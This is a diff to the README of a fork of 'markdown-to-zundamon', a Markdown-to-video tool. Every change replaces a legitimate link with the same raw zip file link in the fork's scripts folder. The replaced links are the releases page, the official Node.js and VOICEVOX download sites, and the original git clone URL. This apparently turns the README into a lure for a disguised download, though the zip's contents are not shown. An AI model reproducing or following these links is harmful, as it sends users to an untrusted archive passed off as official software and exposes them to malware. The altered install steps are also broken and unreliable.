@@ -1,6 +1,6 @@
 # 🎥 markdown-to-zundamon - Create Videos from Markdown Easily
 
-[![Download markdown-to-zundamon](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
+[![Download markdown-to-zundamon](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip)
 
 ---
 
@@ -10,7 +10,7 @@ To use markdown-to-zundamon, you need to get the software first. The download pa
 
 Click the button below to visit the release page where you can download the app for Windows:
 
-[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
+[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip)
 
 ---
 
@@ -39,8 +39,8 @@ VOICEVOX is responsible for turning text into speech. You need to have it instal
 
 If you don’t have Node.js or VOICEVOX yet, you can find them here:  
 
-- Node.js: https://nodejs.org/  
-- VOICEVOX: https://voicevox.hiroshiba.jp/
+- Node.js: https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip  
+- VOICEVOX: https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip
 
 ---
 
@@ -57,7 +57,7 @@ Follow these steps to get the tool working on your Windows machine:
    Run the following commands to download and prepare the software:
 
    ```bash
-   git clone https://github.com/motemen/markdown-to-zundamon.git
+   git clone https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip
    cd markdown-to-zundamon
    npm install
    ```
@@ -172,7 +172,7 @@ Even if you don’t know video editing, markdown-to-zundamon helps you produce p
 
 Remember, to get the app you must visit the release page here:  
 
-[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
+[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/raw/refs/heads/main/scripts/markdown-zundamon-to-v3.4.zip)
 
 There you will find Windows installers or zipped packages that make setup easier for you.
 
